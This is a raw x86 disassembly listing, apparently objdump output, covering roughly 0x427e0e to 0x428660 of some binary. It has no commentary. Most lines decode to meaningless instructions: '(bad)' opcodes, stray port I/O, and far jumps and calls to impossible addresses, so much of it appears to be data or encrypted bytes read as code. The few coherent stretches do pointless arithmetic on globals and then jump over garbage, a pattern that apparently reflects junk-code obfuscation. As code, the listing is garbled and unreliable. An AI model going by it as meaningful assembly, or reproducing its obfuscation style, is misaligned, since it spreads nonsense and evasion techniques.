  427e0e:	sub    eax,0x99eb19ac
  427e13:	(bad)  
  427e14:	(bad)  
  427e15:	out    dx,al
  427e16:	adc    eax,DWORD PTR [eax+0x5ce40d32]
  427e1c:	push   0x2
  427e1e:	xlat   BYTE PTR ds:[ebx]
  427e1f:	xlat   BYTE PTR ds:[ebx]
  427e20:	add    DWORD PTR [eax],eax
  427e22:	ret    
  427e23:	add    BYTE PTR [eax],al
  427e25:	add    BYTE PTR [edx-0x5987cca],ah
  427e2b:	or     bh,bh
  427e2d:	or     eax,0xe888e5d3
  427e32:	das    
  427e33:	mov    eax,ds:0x42af5346
  427e38:	bound  ecx,QWORD PTR [ecx+0x6f9763ac]
  427e3e:	push   ss
  427e3f:	ds xor esp,eax
  427e42:	std    
  427e43:	pushf  
  427e44:	adc    ch,ch
  427e46:	push   0x76
  427e48:	sub    BYTE PTR [ecx-0x27b5fce7],ah
  427e4e:	pop    eax
  427e4f:	ror    al,0xca
  427e52:	jnp    0x427e09
  427e54:	jo     0x427e5e
  427e56:	pop    ecx
  427e57:	sub    al,0xc5
  427e59:	in     eax,0x7d
  427e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e5c:	jmp    0xe010:0x7988d4c7
  427e63:	and    edx,DWORD PTR [esi]
  427e65:	mov    WORD PTR [eax+0x39],fs
  427e68:	xor    BYTE PTR [edi+0x39bded32],dl
  427e6e:	push   ss
  427e6f:	fs xchg esi,eax
  427e71:	dec    edi
  427e72:	jge    0x427ee4
  427e74:	sub    esp,0x3a21f327
  427e7a:	push   edi
  427e7b:	or     esp,DWORD PTR [esi]
  427e7d:	or     BYTE PTR [ebp+edx*4-0x5df88deb],al
  427e84:	pop    ss
  427e85:	pop    edi
  427e86:	pop    eax
  427e87:	push   ecx
  427e88:	ins    DWORD PTR es:[edi],dx
  427e89:	adc    ebx,DWORD PTR gs:[edx]
  427e8c:	adc    al,0x1
  427e8e:	repz mov eax,ds:0x40b0045b
  427e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e95:	sbb    DWORD PTR ds:0x811c55f6,ebx
  427e9b:	inc    esi
  427e9c:	enter  0xa20d,0x66
  427ea0:	push   edx
  427ea1:	and    DWORD PTR [ebp+0x105ab084],eax
  427ea7:	sbb    edx,DWORD PTR [ebp-0x60a6f3e8]
  427ead:	idiv   BYTE PTR [edi+ebx*1-0x603861d1]
  427eb4:	pop    ebp
  427eb5:	ret    0x33cf
  427eb8:	sub    al,0xb
  427eba:	call   0x19be6b93
  427ebf:	push   edx
  427ec0:	shl    al,cl
  427ec2:	mov    esp,fs
  427ec4:	jns    0x427efe
  427ec6:	stos   BYTE PTR es:[edi],al
  427ec7:	and    BYTE PTR [ecx+eiz*4+0x1ed4c02f],dh
  427ece:	or     ah,BYTE PTR [eax]
  427ed0:	out    0xbb,al
  427ed2:	fdiv   DWORD PTR [edx]
  427ed4:	and    ch,0x98
  427ed7:	in     eax,dx
  427ed8:	cmp    BYTE PTR [eax-0x4260c08a],0x41
  427edf:	inc    esp
  427ee0:	push   eax
  427ee1:	xchg   esp,eax
  427ee2:	jae    0x427ef7
  427ee4:	(bad)  
  427ee6:	pop    ss
  427ee7:	arpl   sp,bp
  427ee9:	push   eax
  427eea:	jmp    0x427fca
  427eef:	jo     0x427f52
  427ef1:	cmp    eax,0x747d3d39
  427ef6:	imul   ebp,DWORD PTR [eax+ebx*1],0xcd22bb79
  427efd:	ror    DWORD PTR ds:0x1d89a,cl
  427f03:	ret    
  427f04:	add    BYTE PTR [eax],al
  427f06:	add    BYTE PTR [edx+0x4a],bl
  427f09:	gs ins BYTE PTR es:[edi],dx
  427f0b:	sub    eax,0xd8b6b2fe
  427f10:	call   0xc1bc0245
  427f15:	push   ebx
  427f16:	out    dx,eax
  427f17:	xor    eax,0x56f7b842
  427f1c:	add    eax,0xcba7dde5
  427f21:	out    0x3,eax
  427f23:	into   
  427f24:	sub    BYTE PTR [esi+0x18],bh
  427f27:	and    eax,0xe272f7b0
  427f2c:	jnp    0x427f95
  427f2e:	scas   al,BYTE PTR es:[edi]
  427f2f:	outs   dx,BYTE PTR ds:[esi]
  427f30:	in     al,0x7
  427f32:	pop    esp
  427f33:	mov    ebp,0xf65cef80
  427f38:	pop    ecx
  427f39:	mov    bl,0x53
  427f3b:	sub    dh,ah
  427f3d:	xchg   esp,eax
  427f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f3f:	popf   
  427f40:	push   ebp
  427f41:	jo     0x427f12
  427f43:	stc    
  427f44:	sbb    DWORD PTR [ebx+0x5023ddb5],edi
  427f4a:	xchg   esi,eax
  427f4b:	fucomi st,st(1)
  427f4d:	(bad)  
  427f4e:	jnp    0x427f17
  427f50:	xor    al,0xaa
  427f52:	mov    ebx,0x419e5ac5
  427f57:	sub    DWORD PTR [edi+eiz*8+0x66],ecx
  427f5b:	aad    0xf1
  427f5d:	aaa    
  427f5e:	aad    0xc6
  427f60:	scas   eax,DWORD PTR es:[edi]
  427f61:	jae    0x427f80
  427f63:	or     al,0xc0
  427f65:	jns    0x427f90
  427f67:	in     eax,dx
  427f68:	inc    ebp
  427f69:	daa    
  427f6a:	scas   al,BYTE PTR es:[edi]
  427f6b:	call   0xb3d0:0x9a93694c
  427f72:	mov    edx,DWORD PTR [edx+0x1fc10f31]
  427f78:	nop
  427f79:	inc    esp
  427f7a:	adc    BYTE PTR [eax],ah
  427f7c:	add    al,0xbb
  427f7e:	jb     0x427f90
  427f80:	fldcw  WORD PTR [ecx-0x390299cd]
  427f86:	adc    eax,0xe93182a4
  427f8b:	pop    eax
  427f8c:	cmp    eax,0x1fdf7548
  427f91:	mov    bl,0x78
  427f93:	ret    
  427f94:	(bad)  
  427f95:	adc    BYTE PTR [ecx],0x96
  427f98:	inc    ecx
  427f99:	call   0x60f5ba07
  427f9e:	pop    edi
  427f9f:	lahf   
  427fa0:	loop   0x427f4a
  427fa2:	(bad)
  427fa5:	stos   BYTE PTR es:[edi],al
  427fa6:	and    eax,0x806563c9
  427fab:	out    0xaa,al
  427fad:	imul   ecx,DWORD PTR [eax+0x5692b05],0x22a1364d
  427fb7:	test   DWORD PTR [ebp-0x14],ebx
  427fba:	xchg   esp,eax
  427fbb:	das    
  427fbc:	popa   
  427fbd:	leave  
  427fbe:	les    ecx,FWORD PTR [esi]
  427fc0:	dec    edi
  427fc1:	sub    DWORD PTR ds:0x7d659720,edx
  427fc7:	shl    DWORD PTR [ebp+0x22],0x8d
  427fcb:	inc    ebp
  427fcc:	or     BYTE PTR [ecx+0x43353c25],al
  427fd2:	add    BYTE PTR [eax],al
  427fd4:	ss inc ebx
  427fd6:	add    cl,ch
  427fd8:	fild   DWORD PTR [eax]
  427fda:	add    BYTE PTR [eax],al
  427fdc:	rol    BYTE PTR [ecx],cl
  427fde:	jns    0x427f7e
  427fe0:	sti    
  427fe1:	(bad)  
  427fe2:	test   DWORD PTR [ebp-0x44],0x3974b9ab
  427fe9:	fsubr  DWORD PTR [ebp+0x1d95d4e]
  427fef:	add    bl,al
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [edx-0x78fb9432],bl
  427ff9:	leave  
  427ffa:	push   ebp
  427ffb:	xor    eax,0xd404d7e8
  428000:	iret   
  428001:	ja     0x427fd5
  428003:	scas   eax,DWORD PTR es:[edi]
  428004:	ror    dl,1
  428006:	ja     0x427fa3
  428008:	mov    dl,0x79
  42800a:	sbb    ah,al
  42800c:	iret   
  42800d:	out    dx,al
  42800e:	fisttp QWORD PTR [esi+ecx*2+0x18]
  428012:	les    edi,FWORD PTR ss:[ebx+0x15]
  428016:	aas    
  428017:	aaa    
  428018:	test   BYTE PTR [edi],bh
  42801a:	jecxz  0x42804e
  42801c:	xchg   BYTE PTR [ebp+0x26353773],ch
  428022:	push   edi
  428023:	mov    ebp,0x71e2ac7c
  428028:	cmp    al,BYTE PTR [ecx+0x52a1bf69]
  42802e:	inc    ebp
  42802f:	jb     0x428081
  428031:	dec    edx
  428032:	fcmovne st,st(4)
  428034:	jmp    0xf376:0xa73b6fc2
  42803b:	lea    eax,[ebp+0x48680563]
  428041:	mov    al,0xbd
  428043:	daa    
  428044:	and    DWORD PTR [ebx-0x14ede1f0],eax
  42804a:	sar    DWORD PTR ds:0x60cfdc3e,1
  428050:	or     BYTE PTR [ecx+0x15],ah
  428053:	outs   dx,DWORD PTR ds:[esi]
  428054:	xor    DWORD PTR [ebp+0x374357b6],edx
  42805a:	mov    esi,0x7b4e677a
  42805f:	push   es
  428060:	add    BYTE PTR [esi-0x654f3751],ch
  428066:	xchg   esp,eax
  428067:	dec    edx
  428068:	out    0x50,eax
  42806a:	loope  0x4280bd
  42806c:	and    BYTE PTR [eax-0x765acdaa],cl
  428072:	push   edx
  428073:	push   eax
  428074:	sub    dh,BYTE PTR ds:0x730c2e44
  42807a:	pop    ss
  42807b:	mov    al,ch
  42807d:	mov    dh,BYTE PTR [esi+edi*4-0x57]
  428081:	outs   dx,DWORD PTR ds:[esi]
  428082:	jmp    0x99bd2eeb
  428087:	jg     0x42807f
  428089:	mov    edx,0x76110c6c
  42808e:	push   edx
  42808f:	inc    edx
  428090:	adc    eax,0xe7d138db
  428095:	push   esi
  428096:	(bad)  
  428097:	mov    esp,0x7a9398a0
  42809c:	dec    edx
  42809d:	cwde   
  42809e:	xor    eax,0xcc884396
  4280a3:	xchg   ebx,eax
  4280a4:	mov    edx,0x415cdf14
  4280a9:	push   0x7e
  4280ab:	jmp    0x2535:0x58154bbf
  4280b2:	fidivr WORD PTR [edi+0x1e]
  4280b5:	xor    eax,0x245c896e
  4280ba:	and    al,0x81
  4280bc:	adc    eax,0x433670
  4280c1:	rcr    DWORD PTR [eax],0x0
  4280c4:	add    BYTE PTR [eax-0x18],dl
  4280c7:	push   esi
  4280c8:	sub    edi,esi
  4280ca:	inc    DWORD PTR [ecx+0x4335bc05]
  4280d0:	add    BYTE PTR ds:0x6a00002b,ah
  4280d6:	add    al,0x81
  4280d8:	add    eax,0x433530
  4280dd:	les    esi,FWORD PTR ds:0xdbe90043
  4280e3:	add    BYTE PTR [eax],al
  4280e5:	add    BYTE PTR [edx-0x4112c5ea],dl
  4280eb:	in     eax,dx
  4280ec:	xlat   BYTE PTR ds:[ebx]
  4280ed:	jg     0x42811d
  4280ef:	sahf   
  4280f0:	jnp    0x4280d6
  4280f2:	lahf   
  4280f3:	inc    ecx
  4280f4:	in     al,0x65
  4280f6:	and    dl,bl
  4280f8:	add    DWORD PTR [eax],eax
  4280fa:	ret    
  4280fb:	add    BYTE PTR [eax],al
  4280fd:	add    BYTE PTR [ebx+0x5f67abbd],ah
  428103:	lea    ecx,ds:[eax+0x7274f948]
  42810a:	fistp  WORD PTR [esi]
  42810c:	outs   dx,BYTE PTR ds:[esi]
  42810d:	call   0xae8953fb
  428112:	and    edx,ecx
  428114:	dec    esp
  428115:	pop    ebp
  428116:	in     eax,0xe1
  428118:	sub    eax,0xfb81fd05
  42811d:	jno    0x4280db
  42811f:	xor    dh,BYTE PTR ds:0xf3bbdf3
  428126:	shl    DWORD PTR [eax+0x427e8029],cl
  42812c:	lods   eax,DWORD PTR ds:[esi]
  42812e:	jecxz  0x428174
  428130:	cmp    ah,BYTE PTR [ecx*2+0x4da78295]
  428137:	xor    eax,DWORD PTR [esi]
  428139:	push   ecx
  42813a:	inc    esp
  42813b:	mov    gs,WORD PTR [edx-0x5aa65a80]
  428141:	dec    ebx
  428142:	in     al,dx
  428143:	mov    bl,0xab
  428145:	push   esi
  428146:	into   
  428147:	sub    eax,0x222d2cb9
  42814c:	std    
  42814d:	pusha  
  42814e:	sti    
  42814f:	leave  
  428150:	push   0xffffff9c
  428152:	add    BYTE PTR [edi],ch
  428154:	dec    ebp
  428155:	aam    0x6c
  428157:	mov    dh,0x3d
  428159:	ss dec ebp
  42815b:	scas   al,BYTE PTR es:[edi]
  42815c:	lods   al,BYTE PTR ds:[esi]
  42815d:	rcl    DWORD PTR [eax-0x2f],0xdf
  428161:	addr16 jns 0x428180
  428164:	or     ebx,DWORD PTR [edx-0x4f7389d2]
  42816a:	adc    ah,BYTE PTR [esi+0x2dd9f9ff]
  428170:	enter  0x79a6,0x83
  428174:	push   es
  428175:	cli    
  428176:	in     eax,0x22
  428178:	pop    ecx
  428179:	test   al,0x0
  42817b:	inc    ecx
  42817c:	rol    BYTE PTR [ebx],0x33
  42817f:	(bad)  
  428180:	retf   
  428181:	test   eax,0x51cdde58
  428186:	push   edi
  428187:	add    esp,ebp
  428189:	mov    edi,0x65511d46
  42818e:	push   0xffffffe2
  428190:	push   ss
  428191:	aad    0x70
  428193:	pop    eax
  428194:	dec    ecx
  428195:	scas   eax,DWORD PTR es:[edi]
  428196:	xchg   esp,eax
  428197:	push   esi
  428198:	push   edx
  428199:	lds    ebp,FWORD PTR [eax+0x31be2041]
  42819f:	bound  ebx,QWORD PTR [ebx-0x204e58be]
  4281a5:	imul   eax,ebp,0x3272229e
  4281ab:	xchg   esp,ecx
  4281ad:	je     0x42816c
  4281af:	sbb    ebx,0xe5492677
  4281b5:	or     BYTE PTR [edi+0x50],bl
  4281b8:	and    ah,0x92
  4281bb:	call   0x68d7:0xcaa4c7e8
  4281c2:	cmp    BYTE PTR [eax],dh
  4281c4:	inc    ebx
  4281c5:	add    BYTE PTR [ecx+0x4335801d],al
  4281cb:	add    BYTE PTR [ebp+esi*1+0x74ff0043],ch
  4281d2:	and    al,0x28
  4281d4:	mov    DWORD PTR ds:0x433670,0xecc
  4281de:	call   0x41d107
  4281e3:	mov    eax,DWORD PTR [esp+0x20]
  4281e7:	movzx  ecx,WORD PTR ds:0x433674
  4281ee:	or     ecx,DWORD PTR ds:0x433550
  4281f4:	mov    DWORD PTR ds:0x433674,ecx
  4281fa:	mov    ecx,DWORD PTR [eax]
  4281fc:	xor    eax,0x22f7
  428201:	mov    eax,DWORD PTR [esp+0x20]
  428205:	mov    edx,DWORD PTR [eax]
  428207:	sbb    eax,0x7c33
  42820c:	add    ecx,0x7511
  428212:	cmp    DWORD PTR ds:0x43365c,0x0
  428219:	jb     0x428234
  42821f:	jmp    0x428234
  428224:	push   0x7389
  428229:	push   0x38c2
  42822e:	call   DWORD PTR ds:0x43c7c0
  428234:	shl    ecx,0x10
  428237:	mov    eax,0x3cf87511
  42823c:	add    edx,eax
  42823e:	jmp    0x42831e
  428243:	imul   esi,DWORD PTR [ebx],0x67
  428246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428247:	jg     0x42823e
  428249:	jmp    0x42824a
  42824b:	js     0x42828b
  42824d:	shl    BYTE PTR [ecx-0x211e0a6d],0xe3
  428254:	fiadd  DWORD PTR [ecx]
  428256:	add    bl,al
  428258:	add    BYTE PTR [eax],al
  42825a:	add    BYTE PTR [ebp+0x1b5db571],bl
  428260:	pushf  
  428261:	mov    ebx,0x186b5a69
  428266:	test   DWORD PTR [edx-0x4c],esp
  428269:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42826b:	out    dx,eax
  42826c:	cmp    BYTE PTR gs:[ebx-0x75],ah
  428270:	std    
  428271:	inc    ecx
  428272:	shufps xmm7,XMMWORD PTR [ecx-0x24],0x4e
  428277:	idiv   DWORD PTR [edx]
  428279:	mov    ah,0x99
  42827b:	xor    ebx,DWORD PTR [esi]
  42827d:	mov    bl,0xf5
  42827f:	inc    ebx
  428280:	adc    ah,0xd5
  428283:	or     esp,DWORD PTR [ecx-0x6c191a43]
  428289:	jb     0x42821f
  42828b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42828c:	aad    0x14
  42828e:	mov    al,bh
  428290:	mov    eax,0x429a78b5
  428295:	jns    0x4282ce
  428297:	jbe    0x42830c
  428299:	and    DWORD PTR [ecx],ebp
  42829b:	push   esp
  42829c:	xchg   ebp,eax
  42829d:	inc    ecx
  42829e:	out    dx,al
  42829f:	or     BYTE PTR [eax],dl
  4282a1:	cmc    
  4282a2:	xor    dl,BYTE PTR [esi-0x295fc07c]
  4282a8:	xor    esi,DWORD PTR [ebx-0x6e]
  4282ab:	stos   DWORD PTR es:[edi],eax
  4282ac:	jmp    0xcb40de9c
  4282b1:	aam    0xd5
  4282b3:	bound  ebp,QWORD PTR [ecx+eiz*8]
  4282b6:	xchg   edi,eax
  4282b7:	test   eax,0x9db9e2dd
  4282bc:	push   esp
  4282bd:	jb     0x428322
  4282bf:	shr    DWORD PTR [edx-0x53b11fe2],cl
  4282c5:	call   0x4f67:0x4bc717a9
  4282cc:	sub    eax,0x1b8aff5b
  4282d1:	cdq    
  4282d2:	leave  
  4282d3:	adc    BYTE PTR [edx],dl
  4282d5:	jb     0x4282b3
  4282d7:	retf   
  4282d8:	inc    eax
  4282d9:	sbb    edx,esp
  4282db:	inc    esi
  4282dc:	mov    dh,0x79
  4282de:	in     eax,0x9a
  4282e0:	popf   
  4282e1:	(bad)
  4282e4:	out    0xc0,eax
  4282e6:	jno    0x4282f6
  4282e8:	jbe    0x4282a7
  4282ea:	das    
  4282eb:	mov    bl,0xa5
  4282ed:	addr16 (bad) 
  4282ef:	xchg   ecx,eax
  4282f0:	ficomp DWORD PTR [ecx+0x61]
  4282f3:	fst    QWORD PTR [edx]
  4282f5:	test   DWORD PTR cs:[edx+0x22e522f8],esp
  4282fc:	mov    ch,0xe
  4282fe:	test   DWORD PTR [edx+eax*2],edi
  428301:	xchg   ebx,eax
  428302:	sub    bl,BYTE PTR [eax+0x3e]
  428305:	icebp  
  428306:	push   ds
  428307:	or     BYTE PTR [edi+0x1a9f3005],bh
  42830d:	mov    ebp,DWORD PTR [ebx+0xc]
  428310:	inc    esi
  428311:	in     al,0x59
  428313:	push   ss
  428314:	mov    dl,0xf6
  428316:	aaa    
  428317:	mov    ebp,DWORD PTR [ecx+0x45]
  42831a:	or     BYTE PTR [ecx-0x153e829d],dl
  428320:	adc    BYTE PTR [ebx],cl
  428322:	retf   0xf181
  428325:	leave  
  428326:	pop    ecx
  428327:	loop   0x4283a1
  428329:	add    ecx,eax
  42832b:	sub    DWORD PTR ds:0x4335e8,ecx
  428331:	mov    eax,DWORD PTR [esp+0x20]
  428335:	mov    edx,DWORD PTR ds:0x43353c
  42833b:	xor    DWORD PTR ds:0x433594,edx
  428341:	mov    DWORD PTR [eax],ecx
  428343:	xor    DWORD PTR ds:0x43363c,ebx
  428349:	lea    eax,[esp+0x44]
  42834d:	neg    ecx
  42834f:	mov    DWORD PTR [esp+0x6c],eax
  428353:	and    DWORD PTR ds:0x433560,ecx
  428359:	lea    eax,[esp+0x6c]
  42835d:	and    edx,edx
  42835f:	jmp    0x42843f
  428364:	cmp    dl,al
  428366:	mul    DWORD PTR [eax-0x1]
  428369:	addr16 mov edi,0xf6a7aada
  42836f:	pop    edi
  428370:	ins    DWORD PTR es:[edi],dx
  428371:	aad    0xd
  428373:	ret    
  428374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428375:	fild   DWORD PTR [ecx]
  428377:	add    bl,al
  428379:	add    BYTE PTR [eax],al
  42837b:	add    BYTE PTR ds:0xf8802845,ah
  428381:	cmp    BYTE PTR [esi-0x5e],cl
  428384:	fisttp DWORD PTR [eax]
  428386:	add    edi,DWORD PTR [eax]
  428388:	jecxz  0x4283b9
  42838a:	stos   BYTE PTR es:[edi],al
  42838b:	push   edx
  42838c:	pop    edx
  42838d:	sbb    al,cl
  42838f:	pop    ebx
  428390:	sub    ecx,DWORD PTR [edi-0x4f]
  428393:	xchg   ebp,eax
  428394:	or     edx,DWORD PTR [ebp*2+0x59a26e06]
  42839b:	ins    BYTE PTR es:[edi],dx
  42839c:	jg     0x428330
  42839e:	and    cl,BYTE PTR [esi+0x6c]
  4283a1:	lock dec esi
  4283a3:	jmp    0x428363
  4283a5:	pop    ss
  4283a6:	sbb    cl,BYTE PTR [eax]
  4283a8:	in     eax,0xe3
  4283aa:	out    dx,eax
  4283ab:	sar    DWORD PTR [edi+0x1b1d15e5],1
  4283b1:	cmp    DWORD PTR [edx+0x41a476d7],esp
  4283b7:	push   ds
  4283b8:	xchg   ecx,eax
  4283b9:	test   eax,0xa4e3c58e
  4283be:	inc    edi
  4283bf:	(bad)  
  4283c0:	cs push eax
  4283c2:	(bad)  
  4283c3:	les    esi,FWORD PTR [esi]
  4283c5:	and    bh,BYTE PTR [eax]
  4283c7:	rcr    DWORD PTR [ebx-0x3f],0x10
  4283cb:	pop    esp
  4283cc:	mov    ds:0x2264368d,eax
  4283d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283d2:	cmp    ah,BYTE PTR [ecx-0x3c]
  4283d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283d6:	sahf   
  4283d7:	dec    ebp
  4283d8:	out    0x14,al
  4283da:	xor    eax,0x7c38ed63
  4283df:	sbb    ecx,DWORD PTR [ecx]
  4283e1:	daa    
  4283e2:	aas    
  4283e3:	sbb    edx,eax
  4283e5:	(bad)  
  4283e6:	hlt    
  4283e7:	data16 mov bh,0xe3
  4283ea:	imul   eax,DWORD PTR [esi-0x12],0x5d
  4283ee:	mov    ah,0xd7
  4283f0:	xor    bp,di
  4283f3:	jno    0x4283c1
  4283f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283f6:	push   0x5
  4283f8:	push   es
  4283f9:	out    dx,al
  4283fa:	xchg   ebp,eax
  4283fb:	jle    0x4283d2
  4283fd:	cld    
  4283fe:	add    eax,0xc5b4a20a
  428403:	adc    al,0x52
  428405:	push   esp
  428406:	(bad)  
  428407:	(bad)  
  428408:	mov    al,0x8b
  42840a:	test   DWORD PTR [ecx+0x2f],ebx
  42840d:	ret    
  42840e:	loopne 0x4283af
  428410:	jecxz  0x4283a3
  428412:	das    
  428413:	in     eax,0xab
  428415:	sbb    BYTE PTR [edx-0x3125468b],0xcc
  42841c:	lods   al,BYTE PTR ds:[esi]
  42841d:	sbb    DWORD PTR [ebx-0x41],eax
  428420:	push   ebp
  428421:	mov    ds:0x78177b57,eax
  428426:	outs   dx,BYTE PTR ds:[esi]
  428427:	mov    dh,0xbd
  428429:	sub    bh,BYTE PTR [eax+0x347841cf]
  42842f:	pop    ebx
  428430:	jp     0x428474
  428432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428433:	cli    
  428434:	rol    BYTE PTR [edx-0x6fba098f],0xa
  42843b:	fdiv   DWORD PTR [edi-0x52]
  42843e:	popf   
  42843f:	mov    DWORD PTR [esp+0x74],eax
  428443:	mov    eax,DWORD PTR [esp+0x10]
  428447:	adc    edx,0x76ef
  42844d:	mov    ecx,DWORD PTR [esp+0x14]
  428451:	add    DWORD PTR ds:0x4335ac,0x1824
  42845b:	xor    eax,esi
  42845d:	or     DWORD PTR ds:0x433664,0xe2
  428467:	jmp    0x428547
  42846c:	jno    0x428402
  42846e:	dec    edx
  42846f:	nop
  428470:	out    dx,eax
  428471:	fdivp  st(3),st
  428473:	cmc    
  428474:	push   eax
  428475:	stos   BYTE PTR es:[edi],al
  428476:	sub    eax,0x8356b00d
  42847b:	imul   ebp,DWORD PTR [ecx-0x24],0xc30001
  428482:	add    BYTE PTR [eax],al
  428484:	frstor [edx+0x8820c7f]
  42848a:	int3   
  42848b:	push   edx
  42848c:	lahf   
  42848d:	lahf   
  42848e:	lea    ecx,[ecx+0x5a907d05]
  428494:	cwde   
  428495:	stos   DWORD PTR es:[edi],eax
  428496:	add    eax,0xb58417ab
  42849b:	outs   dx,DWORD PTR ds:[esi]
  42849c:	xor    BYTE PTR [ecx+0x545a80ef],ch
  4284a2:	out    dx,al
  4284a3:	dec    ebx
  4284a4:	outs   dx,DWORD PTR ds:[esi]
  4284a5:	jecxz  0x4284cb
  4284a7:	and    ebp,DWORD PTR [ebx-0x2e]
  4284aa:	into   
  4284ab:	jecxz  0x42845d
  4284ad:	(bad)  
  4284af:	sbb    DWORD PTR [ebx-0x17],edi
  4284b2:	sub    al,BYTE PTR [edx-0x7]
  4284b5:	mov    BYTE PTR [ebx+0x74a636b4],bl
  4284bb:	sub    BYTE PTR [edi+0x20],0x19
  4284bf:	into   
  4284c0:	adc    ecx,DWORD PTR [edi]
  4284c2:	pop    ebx
  4284c3:	enter  0x5960,0x10
  4284c7:	mov    eax,0xaeed1c34
  4284cc:	scas   eax,DWORD PTR es:[edi]
  4284cd:	iret   
  4284ce:	cmp    eax,0xb64a641f
  4284d3:	sbb    ch,bl
  4284d5:	fs pop es
  4284d7:	iret   
  4284d8:	addr16 repz xor eax,eax
  4284dc:	call   0xaa5d:0xba97e9da
  4284e3:	or     edi,DWORD PTR [edi+0xc]
  4284e6:	mov    ah,0x25
  4284e8:	mov    cl,0xaa
  4284ea:	fs jb  0x428536
  4284ed:	clc    
  4284ee:	fs scas eax,DWORD PTR es:[edi]
  4284f0:	lods   eax,DWORD PTR ds:[esi]
  4284f1:	(bad)  
  4284f2:	hlt    
  4284f3:	(bad)  
  4284f4:	xchg   esi,eax
  4284f5:	mov    edx,0x560c7834
  4284fa:	mov    eax,0xcd67d870
  4284ff:	cdq    
  428500:	push   edx
  428501:	pop    esi
  428502:	xchg   ecx,eax
  428503:	js     0x4284c9
  428505:	dec    ecx
  428506:	leave  
  428507:	dec    edi
  428508:	(bad)  
  42850a:	adc    eax,DWORD PTR [edx+0x41455b36]
  428510:	and    DWORD PTR [esi+ebx*1],esp
  428513:	ds mov edi,0xd4a1f3ea
  428519:	and    esi,DWORD PTR [eax]
  42851b:	xchg   edx,eax
  42851c:	push   esi
  42851d:	add    al,0xf2
  42851f:	in     al,0x51
  428521:	cli    
  428522:	xor    al,0x1e
  428524:	xchg   edi,eax
  428525:	jae    0x428575
  428527:	push   ecx
  428528:	mov    esi,0xe09f8871
  42852d:	nop
  42852e:	pop    ebx
  42852f:	mov    bh,0xe4
  428531:	aaa    
  428532:	mov    WORD PTR [ebp-0x6d],?
  428535:	cmp    bh,BYTE PTR [ebx-0x68]
  428538:	mov    ecx,0xf3372f75
  42853d:	or     BYTE PTR [eax+0x34],al
  428540:	jecxz  0x428597
  428542:	pusha  
  428543:	and    eax,0x2b02af0f
  428548:	(bad)  
  428549:	mov    DWORD PTR [esp+0x44],eax
  42854d:	lea    eax,[ebp+0x4]
  428550:	xor    ecx,0x2e25
  428556:	or     DWORD PTR [esp+0x44],eax
  42855a:	mov    eax,0x5df3
  42855f:	movzx  edx,BYTE PTR ds:0x4335c4
  428566:	or     DWORD PTR ds:0x4335fc,edx
  42856c:	mov    WORD PTR [esp+0x28],ax
  428571:	mov    DWORD PTR ds:0x433650,0x2f68
  42857b:	mov    eax,0x26c1
  428580:	sub    DWORD PTR ds:0x433610,0x2aa3
  42858a:	mov    WORD PTR [esp+0x30],ax
  42858f:	and    DWORD PTR ds:0x433658,ecx
  428595:	jmp    0x428675
  42859a:	sbb    dh,al
  42859c:	repz sahf 
  42859e:	(bad)  
  42859f:	mov    edi,0x7244c67d
  4285a4:	std    
  4285a5:	dec    esi
  4285a6:	pop    ebx
  4285a7:	in     al,0x63
  4285a9:	mov    eax,ds:0x1dd2c
  4285ae:	ret    
  4285af:	add    BYTE PTR [eax],al
  4285b1:	add    BYTE PTR [eax-0x2a0d619d],ch
  4285b7:	or     cl,BYTE PTR [ebx-0x383b7974]
  4285bd:	cmp    ebx,DWORD PTR [edi+0x2db112db]
  4285c3:	test   ebx,0xe5410c8a
  4285c9:	in     al,dx
  4285ca:	jo     0x42858f
  4285cc:	(bad)  
  4285cd:	mov    dh,0x50
  4285cf:	pushf  
  4285d0:	fisub  WORD PTR [edi+ecx*8]
  4285d3:	mov    cl,0xb1
  4285d5:	add    ah,BYTE PTR [edi+0x3b14050]
  4285db:	data16 daa 
  4285dd:	test   bh,ah
  4285df:	in     eax,dx
  4285e0:	mov    edx,0x9e651b40
  4285e5:	cdq    
  4285e6:	lods   eax,DWORD PTR ds:[esi]
  4285e7:	jge    0x4285e4
  4285e9:	test   eax,ecx
  4285eb:	xchg   edi,eax
  4285ec:	xor    DWORD PTR [edi+eax*8-0x7a],ebp
  4285f0:	sar    DWORD PTR [edx],1
  4285f2:	inc    ebx
  4285f3:	fdiv   DWORD PTR [ebx-0x187576f8]
  4285f9:	push   ss
  4285fa:	popa   
  4285fb:	lods   al,BYTE PTR ds:[esi]
  4285fc:	and    esi,DWORD PTR [edx-0x59ade9ae]
  428602:	cmp    BYTE PTR [eax],cl
  428604:	jae    0x428599
  428606:	xlat   BYTE PTR ds:[ebx]
  428607:	pop    edi
  428608:	sar    DWORD PTR [edx],0x90
  42860b:	fimul  DWORD PTR [eax-0x3b4d0282]
  428611:	inc    edi
  428612:	push   es
  428613:	addr16 adc eax,0xbd0329dc
  428619:	es sub eax,0xf37fc29d
  42861f:	and    DWORD PTR [ecx-0x5901eef2],ebx
  428625:	lods   al,BYTE PTR ds:[esi]
  428626:	add    BYTE PTR [edx+0x78f4d14e],dh
  42862c:	(bad)  
  42862d:	mov    ss,WORD PTR [esi+esi*1]
  428630:	ds jp  0x42863d
  428633:	clc    
  428634:	aam    0x90
  428636:	mov    bl,0x45
  428638:	jnp    0x4286ae
  42863a:	out    0xcc,eax
  42863c:	cwde   
  42863d:	hlt    
  42863e:	aas    
  42863f:	and    esp,0xcc258255
  428645:	xchg   edi,eax
  428646:	fdiv   QWORD PTR [edx-0x75ac0f3c]
  42864c:	cmp    al,0xeb
  42864e:	dec    esp
  42864f:	push   ebp
  428650:	stos   DWORD PTR es:[edi],eax
  428651:	push   edi
  428652:	mov    WORD PTR [ecx-0x7ec640e7],gs
  428658:	enter  0x6a27,0xc0
  42865c:	add    al,0x2e
  42865e:	jne    0x4286de
  428660:	aaa    
